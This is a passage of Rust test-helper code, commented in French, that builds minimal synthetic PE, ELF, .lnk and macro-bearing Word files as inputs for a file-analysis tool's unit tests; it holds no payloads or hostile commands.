        f[opt + 36..opt + 40].copy_from_slice(&0x200u32.to_le_bytes());
        f[opt + 68..opt + 70].copy_from_slice(&3u16.to_le_bytes());
        f[opt + 108..opt + 112].copy_from_slice(&16u32.to_le_bytes());
        let table = opt + usize::from(taille_opt);
        let mut position = entetes;
        let mut adresse = 0x1000u32;
        let mut corps = Vec::new();
        for (k, (nom, car, donnees)) in sections.iter().enumerate() {
            let s = table + k * 40;
            let n = nom.as_bytes();
            f[s..s + n.len().min(8)].copy_from_slice(&n[..n.len().min(8)]);
            f[s + 8..s + 12].copy_from_slice(&(donnees.len() as u32).to_le_bytes());
            f[s + 12..s + 16].copy_from_slice(&adresse.to_le_bytes());
            let brute = aligne(donnees.len());
            f[s + 16..s + 20].copy_from_slice(&(brute as u32).to_le_bytes());
            f[s + 20..s + 24].copy_from_slice(&(position as u32).to_le_bytes());
            f[s + 36..s + 40].copy_from_slice(&car.to_le_bytes());
            let mut d = donnees.to_vec();
            d.resize(brute, 0);
            corps.extend(d);
            position += brute;
            adresse += (brute as u32).div_ceil(0x1000) * 0x1000;
        }
        f[opt + 56..opt + 60].copy_from_slice(&adresse.to_le_bytes());
        f.extend(corps);
        if signe {
            let debut = f.len();
            let mut cert = Vec::new();
            cert.extend(16u32.to_le_bytes());
            cert.extend(0x0200u16.to_le_bytes());
            cert.extend(0x0002u16.to_le_bytes());
            cert.extend([0x30, 0x82, 0, 0, 0, 0, 0, 0]);
            f.extend(&cert);
            // Répertoire 4 (sécurité) : position dans le fichier et taille.
            let rep = opt + 112 + 4 * 8;
            f[rep..rep + 4].copy_from_slice(&(debut as u32).to_le_bytes());
            f[rep + 4..rep + 8].copy_from_slice(&(cert.len() as u32).to_le_bytes());
        }
        f
    }

    /// Un ELF 64 bits minimal, un segment PT_LOAD aux droits `drapeaux` (1 X, 2 W, 4 R).
    fn elf(drapeaux: u32) -> Vec<u8> {
        let mut f = vec![0u8; 0x100];
        f[0..4].copy_from_slice(b"\x7fELF");
        f[4] = 2;
        f[5] = 1;
        f[6] = 1;
        f[16..18].copy_from_slice(&2u16.to_le_bytes());
        f[18..20].copy_from_slice(&0x3Eu16.to_le_bytes());
        f[20..24].copy_from_slice(&1u32.to_le_bytes());
        f[24..32].copy_from_slice(&0x40_0078u64.to_le_bytes());
        f[32..40].copy_from_slice(&64u64.to_le_bytes());
        f[52..54].copy_from_slice(&64u16.to_le_bytes());
        f[54..56].copy_from_slice(&56u16.to_le_bytes());
        f[56..58].copy_from_slice(&1u16.to_le_bytes());
        f[58..60].copy_from_slice(&64u16.to_le_bytes());
        let ph = 64;
        f[ph..ph + 4].copy_from_slice(&1u32.to_le_bytes());
        f[ph + 4..ph + 8].copy_from_slice(&drapeaux.to_le_bytes());
        f[ph + 16..ph + 24].copy_from_slice(&0x40_0000u64.to_le_bytes());
        f[ph + 24..ph + 32].copy_from_slice(&0x40_0000u64.to_le_bytes());
        f[ph + 32..ph + 40].copy_from_slice(&0x100u64.to_le_bytes());
        f[ph + 40..ph + 48].copy_from_slice(&0x100u64.to_le_bytes());
        f[ph + 48..ph + 56].copy_from_slice(&0x1000u64.to_le_bytes());
        f
    }

    pub(crate) fn elf_wx() -> Vec<u8> {
        elf(7)
    }

    pub(crate) fn elf_sain() -> Vec<u8> {
        elf(5)
    }

    /// Un raccourci .lnk minimal : en-tête, chemin local (LinkInfo) et arguments éventuels.
    pub(crate) fn lnk(cible: &str, arguments: Option<&str>) -> Vec<u8> {
        crate::analyse::lnk::essais::raccourci(None, Some(cible), arguments, &[])
    }

    /// Un document Word (OLE) dont le projet VBA porte un module à `source`.
    pub(crate) fn doc_a_macro(source: &str) -> Vec<u8> {
        use crate::analyse::{cfb, ovba, vba};
        let decalage = 0x40u32;
        let dir = ovba::essais::compresser(&vba::essais::dir(&[("Module1", "Module1", decalage, 0x21)]));
        let mut module = vec![0xCCu8; decalage as usize];
        let source = format!("Attribute VB_Name = \"Module1\"\r\n{source}");
        module.extend(ovba::essais::compresser(source.as_bytes()));
        let mut fib = vec![0u8; 64];
        fib[..2].copy_from_slice(&0xA5ECu16.to_le_bytes());
        cfb::essais::fichier(&[
            ("Macros", None),
            ("Macros/VBA", None),
            ("Macros/VBA/dir", Some(&dir)),
            ("Macros/VBA/Module1", Some(&module)),
            ("Macros/VBA/_VBA_PROJECT", Some(b"\xCC\x61\xFF\xFF")),
            ("WordDocument", Some(&fib)),
        ])
    }
}
